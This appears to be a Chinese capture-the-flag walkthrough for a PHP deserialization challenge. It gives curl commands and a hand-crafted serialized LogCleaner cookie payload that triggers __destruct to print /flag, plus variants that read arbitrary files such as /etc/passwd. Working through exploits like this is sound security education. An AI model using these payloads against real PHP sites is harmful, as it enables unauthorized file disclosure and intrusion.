# 39 · 纯 curl 手工四步（反序列化 POP 链）

> 把 `$B` 换成目标地址（**末尾不带斜杠**）。所有命令直接复制到终端跑。

```bash
B=http://47.120.76.57:端口
```

## Step 1 · 摸 Cookie 格式

确认服务器用 `base64(serialize(...))` 当 Cookie：

```bash
curl -sI "$B/" | grep -i set-cookie
```

预期看到类似 `Set-Cookie: pref=Tzo4OiJVc2VyUHJlZi...`。

解码验证一下：

```bash
curl -sI "$B/" | grep -i set-cookie | sed 's/.*pref=//;s/;.*//' | base64 -d
```

预期输出：

```
O:8:"UserPref":2:{s:5:"theme";s:5:"light";s:4:"lang";s:2:"zh";}
```

✅ 是 PHP 原生序列化格式，攻击面成立。

## Step 2 · 手写恶意 POP 链

目标：构造一个 `LogCleaner` 对象，`logfile=/flag`、`enabled=true`，让它的 `__destruct` 自动 echo 出 flag。

PHP 序列化格式速记：

| 符号 | 含义 |
|---|---|
| `O:<类名字节数>:"<类名>":<属性数>:{ ... }` | 对象 |
| `s:<字节数>:"字符串";` | 字符串 |
| `b:1;` / `b:0;` | 布尔 |

拼出来的字符串：

```
O:10:"LogCleaner":2:{s:7:"logfile";s:5:"/flag";s:7:"enabled";b:1;}
```

## Step 3 · base64 编码

```bash
PAYLOAD=$(echo -n 'O:10:"LogCleaner":2:{s:7:"logfile";s:5:"/flag";s:7:"enabled";b:1;}' | base64)
echo $PAYLOAD
```

预期输出：

```
TzoxMDoiTG9nQ2xlYW5lciI6Mjp7czo3OiJsb2dmaWxlIjtzOjU6Ii9mbGFnIjtzOjc6ImVuYWJsZWQiO2I6MTt9
```

> ⚠ `echo -n` 的 `-n` 必须有，否则末尾多一个换行，base64 出来的字符串解出来语法错。

## Step 4 · 带 Cookie 发请求拿 flag

```bash
curl -s "$B/" -b "pref=$PAYLOAD" | grep -oE 'TOGOGO-flag\{[^}]+\}'
```

预期输出：

```
TOGOGO-flag{xxxxxxxx}
```

如果没 grep 到，去掉 `| grep ...` 看完整 HTML，flag 通常在 `<pre>...</pre>` 里。

## 一键全自动版（懒人）

```bash
B=http://47.120.76.57:端口

PAYLOAD=$(echo -n 'O:10:"LogCleaner":2:{s:7:"logfile";s:5:"/flag";s:7:"enabled";b:1;}' | base64)
curl -s "$B/" -b "pref=$PAYLOAD" | grep -oE 'TOGOGO-flag\{[^}]+\}'
```

三行解决。

## 想读别的文件？

改 `s:5:"/flag"` 这一段，**两个数字都要改**：

| 想读 | 字节数 | 片段 |
|---|---|---|
| `/flag` | 5 | `s:5:"/flag"` |
| `/etc/passwd` | 11 | `s:11:"/etc/passwd"` |
| `/etc/hostname` | 13 | `s:13:"/etc/hostname"` |

举例读 `/etc/passwd`：

```bash
PAYLOAD=$(echo -n 'O:10:"LogCleaner":2:{s:7:"logfile";s:11:"/etc/passwd";s:7:"enabled";b:1;}' | base64)
curl -s "$B/" -b "pref=$PAYLOAD"
```

不想自己数字节，让 shell 算：

```bash
F=/etc/passwd
PAYLOAD=$(echo -n "O:10:\"LogCleaner\":2:{s:7:\"logfile\";s:${#F}:\"${F}\";s:7:\"enabled\";b:1;}" | base64)
curl -s "$B/" -b "pref=$PAYLOAD"
```

`${#F}` 是 bash 取字符串字节数的语法。

## 常见踩坑

| 现象 | 原因 | 解决 |
|---|---|---|
| 响应是默认页面，没 flag | 序列化字符串长度算错（最常见） | `s:5:"/flag"` 里 5 必须等于 `/flag` 字节数 |
| 加了 `-n` 还是不对 | base64 末尾被复制时多了空格/换行 | 用变量传 `$PAYLOAD`，不要手动复制 |
| `b:0` 时没输出 | `__destruct` 里 `if ($this->enabled)` 拦下 | 必须 `b:1;` |
| 想读的文件不存在 | `is_file($logfile)` 返回 false | 换个确定存在的文件先试，例如 `/etc/hostname` |
| 中文/UTF-8 文件名 | 字节数 ≠ 字符数 | 用 `${#F}` 让 shell 算 |
| `protected`/`private` 属性 | 序列化含 `\x00` 不可见字符 | 用 PHP 真机 `serialize()` 生成，curl 命令行处理不了 |

## 一句话原理

`unserialize` **不走构造函数**，但对象被覆盖/销毁时**会走 `__destruct`**。题目里：

```
unserialize → 凭空造出 LogCleaner（属性全是攻击者控制的值）
   ↓
instanceof UserPref ? 不是 → 用 new UserPref() 覆盖
   ↓
旧的 LogCleaner 没人引用 → PHP 立刻 GC → 调用 __destruct
   ↓
echo file_get_contents('/flag')  ★ flag 出现在响应里
```
